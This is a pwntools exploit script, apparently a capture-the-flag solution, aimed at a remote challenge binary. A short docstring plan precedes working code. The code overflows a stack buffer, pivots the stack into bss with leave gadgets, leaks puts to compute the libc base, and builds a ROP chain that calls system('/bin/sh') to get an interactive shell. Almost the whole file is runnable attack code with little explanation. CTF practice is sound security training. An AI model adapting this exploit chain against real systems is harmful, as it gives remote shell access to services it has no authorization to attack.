'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)

1. hijack rbp to bss_addr + 0x800 (too low address cant execute)
2. execute read function to read ROPchain into buf
3. leave2buf to ROPchain to leak libc address
4. leave2buf to ROPchain to libc.system('/bin/sh')
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "26904" 
filename = "./pwn"
elf = ELF(filename)
local_libc = '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6'
remote_libc = './libc.so.6'
libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

puts_plt_addr = elf.plt['puts']
puts_got_addr = elf.got['puts']
read_gadget_addr = 0x00000000004011FF # lea rax, [rbp+buf]; ...; call _read | buf==-0x50
bss_addr = elf.bss() + 0x800 # 0x404700 too low address cant work
pop_rdi_ret_addr = 0x00000000004012b3
ret_addr = 0x0000000000401228
vuln_addr = 0x00000000004011db
leave_addr = 0x0000000000401227
buffer_overflow_size = 0x50

def B():
    gdb.attach(io)
    pause()

def pwn():
    payload = cyclic(buffer_overflow_size) + p64(bss_addr) + p64(read_gadget_addr)
    io.sendafter(b'just chat with me:\n', payload)
    # B()
    # payload = p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(read_gadget_addr) # rbp = 0 
    payload = p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(vuln_addr) # reset rbp
    payload = payload.ljust(buffer_overflow_size, b'f')
    payload += p64(bss_addr - 0x58) + p64(leave_addr) # (pop rbp; ret;) * 2 | 0x50 + 8 = 0x58
    io.sendafter(b'so funny\n', payload) # read(0, buf, 0x60)
    
    # puts(puts_got_addr)
    io.recvuntil(b'so funny\n')
    puts_addr = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
    log.info('puts address: {}'.format(hex(puts_addr)))

    libc_base = puts_addr - libc.sym['puts']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
    system_addr = libc_base + libc.sym['system']
    log.info('libc base address: {}'.format(hex(libc_base)))
    log.info('system address: {}'.format(hex(system_addr)))

    payload = p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(ret_addr) + p64(system_addr)
    # payload = p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
    payload = payload.ljust(buffer_overflow_size, b'f')
    # get rsp by debugging | 0x4043E8 - 0x58 = 0x404390 | 0x404420 - 0x404390 = 0x90
    # or calculating | bss_addr - 0x50 * 2 + 0x8 * 2 | leave * 2 for pop rbp * 2
    payload += p64(bss_addr - 0x90) + p64(leave_addr)
    io.sendafter(b'just chat with me:\n', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
